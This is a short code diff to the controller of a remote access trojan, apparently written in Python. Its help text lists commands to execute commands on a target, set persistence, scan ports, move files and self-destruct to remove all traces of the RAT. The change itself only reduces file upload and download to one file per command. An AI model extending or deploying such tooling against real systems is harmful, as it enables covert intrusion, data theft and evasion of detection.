@@ -33,7 +33,7 @@ BANNER = '''
 HELP_TEXT = '''
 client <id>         - Connect to a client.
 clients             - List connected clients.
-download <files>    - Download file(s).
+download <file>     - Download a file.
 execute <command>   - Execute a command on the target.
 help                - Show this help menu.
 kill                - Kill the client connection.
@@ -43,7 +43,7 @@ scan <ip>           - Scan top 25 ports on a single host.
 selfdestruct        - Remove all traces of the RAT from the target system.
 survey              - Run a system survey.
 unzip <file>        - Unzip a file.
-upload <files>      - Upload files(s).
+upload <file>       - Upload a file.
 wget <url>          - Download a file from the web.'''
 COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
              'persistence', 'quit', 'rekey', 'scan', 'selfdestruct', 'survey',
@@ -115,15 +115,11 @@ class ClientConnection(common.Client):
 
         # download a file
         elif cmd == 'download':
-            for fname in action.split():
-                fname = fname.strip()
-                self.recvfile(fname)
+            self.recvfile(action.rstrip())
 
         # send file
         elif cmd == 'upload':
-            for fname in action.split():
-                fname = fname.strip()
-                self.sendfile(fname)
+            self.sendfile(action.rstrip())
 
         # regenerate DH key
         elif cmd == 'rekey':
